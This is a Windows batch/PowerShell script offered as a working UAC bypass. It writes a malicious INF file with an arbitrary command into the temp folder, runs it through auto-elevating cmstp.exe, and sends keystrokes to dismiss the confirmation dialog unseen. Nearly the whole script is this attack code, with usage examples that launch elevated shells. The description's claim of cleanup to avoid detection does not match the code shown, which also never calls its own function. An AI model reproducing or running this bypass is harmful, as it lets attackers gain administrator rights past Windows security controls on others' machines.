<# : batch portion
@echo off

fltmc > nul 2>&1 || (
	echo Administrator privileges are required.
	PowerShell Start -Verb RunAs '%0' 2> nul || (
		echo You must run this script as admin.
		exit /b 1
	)
	exit /b
)

powershell -nop "& ([Scriptblock]::Create((Get-Content '%~f0' -Raw)))"
exit /b %ERRORLEVEL%
: end batch / begin PowerShell #>

<#
.SYNOPSIS
    CMSTP UAC Bypass Script for Windows

.DESCRIPTION
    This script provides a method to bypass Windows User Account Control (UAC)
    using the Connection Manager Profile Installer (CMSTP). It works by:
    - Creating a malicious INF file with custom commands
    - Using CMSTP's auto-elevation to execute those commands with admin rights
    - Cleaning up after execution to avoid detection

.PARAMETER command
    The command to execute with elevated privileges

.EXAMPLE
    .\UACbypasses.bat cmd.exe /c powershell
    Launches PowerShell with elevated privileges

.EXAMPLE
    .\UACbypasses.bat -CommandToRun 'echo Hello, World!'
    Executes the echo command with elevated privileges

.EXAMPLE
    .\UACbypasses.bat cmd.exe /c "C:\Users\Administrator\Desktop\Aurora.cmd"
    Runs the specified batch file with elevated privileges

.NOTES
    Version: 1.0
    Warning: Use with caution - bypassing UAC can be dangerous
    Requirements: Windows OS with UAC enabled, CMSTP.exe present in system32
    Author: Based on work from:
            - https://github.com/tehstoni/RustyKeys
            - https://github.com/zoicware/zScripts/blob/main/cmstpBypass.bat
#>


function cmstpBypass{
param(
    [string]$command
)

$infFile = @"
[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
$command
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@

$cmstp = 'C:\windows\system32\cmstp.exe'
$fileName = New-Guid
$infFilePath = New-Item "$env:TEMP\$fileName.inf" -Value $infFile -Force 

if(Test-Path $cmstp){
Start-Process -FilePath $cmstp -ArgumentList "/au `"$($infFilePath.FullName)`""
$wshell = New-Object -ComObject wscript.shell
#hit ok on the window 
$running = $true
do {
  $openWindows = Get-Process | Where-Object { $_.MainWindowTitle -ne '' } | Select-Object MainWindowTitle
  foreach ($window in $openWindows) {
    if ($window.MainWindowTitle -eq 'CorpVPN') {
      $wshell.SendKeys('~')
      $running = $false
    }
  }
}while ($running)

}else{
    Write-Error "CMSTP.exe Doesnt Exist at $cmstp"
}
}

